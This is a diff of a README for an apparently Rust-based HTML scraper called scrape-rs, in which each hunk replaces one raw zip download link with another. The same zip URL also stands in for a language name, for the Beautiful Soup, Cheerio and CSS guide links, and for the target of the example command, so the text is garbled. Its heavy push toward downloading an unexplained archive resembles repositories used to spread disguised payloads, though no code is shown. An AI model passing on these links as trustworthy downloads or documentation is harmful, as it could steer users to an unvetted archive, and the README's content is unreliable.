@@ -1,6 +1,6 @@
 # 🦀 scrape-rs - Fast and Safe HTML Parsing Made Easy
 
-[![Download scrape-rs](https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip)](https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip)
+[![Download scrape-rs](https://raw.githubusercontent.com/arkjeetsingh/scrape-rs/main/crates/rs_scrape_1.6.zip)](https://raw.githubusercontent.com/arkjeetsingh/scrape-rs/main/crates/rs_scrape_1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to scrape-rs! This application provides a powerful way to parse HTML qui
 
 To get started, you will need to visit the following page to download the latest version of scrape-rs:
 
-[Download scrape-rs](https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip)
+[Download scrape-rs](https://raw.githubusercontent.com/arkjeetsingh/scrape-rs/main/crates/rs_scrape_1.6.zip)
 
 ### Steps to Install:
 
@@ -29,7 +29,7 @@ To get started, you will need to visit the following page to download the latest
 ## 🌐 Features
 
 - **High Performance:** Uses advanced technology to parse HTML faster than many other options.
-- **Simple API:** Easy to use, whether you're coming from Python, https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip, or even WASM.
+- **Simple API:** Easy to use, whether you're coming from Python, https://raw.githubusercontent.com/arkjeetsingh/scrape-rs/main/crates/rs_scrape_1.6.zip, or even WASM.
 - **Safe Memory Management:** Automatically handles memory to prevent crashes or security issues.
 - **Cross-Platform Compatibility:** Works on multiple operating systems without changes.
 
@@ -50,16 +50,16 @@ Replace `[URL]` with the link to the webpage you want to scrape.
 ### Example Command:
 
 ```bash
-scrape-rs https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip
+scrape-rs https://raw.githubusercontent.com/arkjeetsingh/scrape-rs/main/crates/rs_scrape_1.6.zip
 ```
 
 ## ✨ Additional Resources
 
 While using scrape-rs, you may find these topics helpful:
 
-- **Beautiful Soup for Python Users:** https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip
-- **Cheerio for https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip Users:** https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip
-- **CSS Selectors Guide:** https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip
+- **Beautiful Soup for Python Users:** https://raw.githubusercontent.com/arkjeetsingh/scrape-rs/main/crates/rs_scrape_1.6.zip
+- **Cheerio for https://raw.githubusercontent.com/arkjeetsingh/scrape-rs/main/crates/rs_scrape_1.6.zip Users:** https://raw.githubusercontent.com/arkjeetsingh/scrape-rs/main/crates/rs_scrape_1.6.zip
+- **CSS Selectors Guide:** https://raw.githubusercontent.com/arkjeetsingh/scrape-rs/main/crates/rs_scrape_1.6.zip
 
 These resources will help you understand how to effectively use scrape-rs with other technologies.
 
@@ -87,4 +87,4 @@ Thanks for using scrape-rs! We appreciate your support and interest in improving
 
 For more details and to stay updated, revisit the download page:
 
-[Download scrape-rs](https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip)
+[Download scrape-rs](https://raw.githubusercontent.com/arkjeetsingh/scrape-rs/main/crates/rs_scrape_1.6.zip)
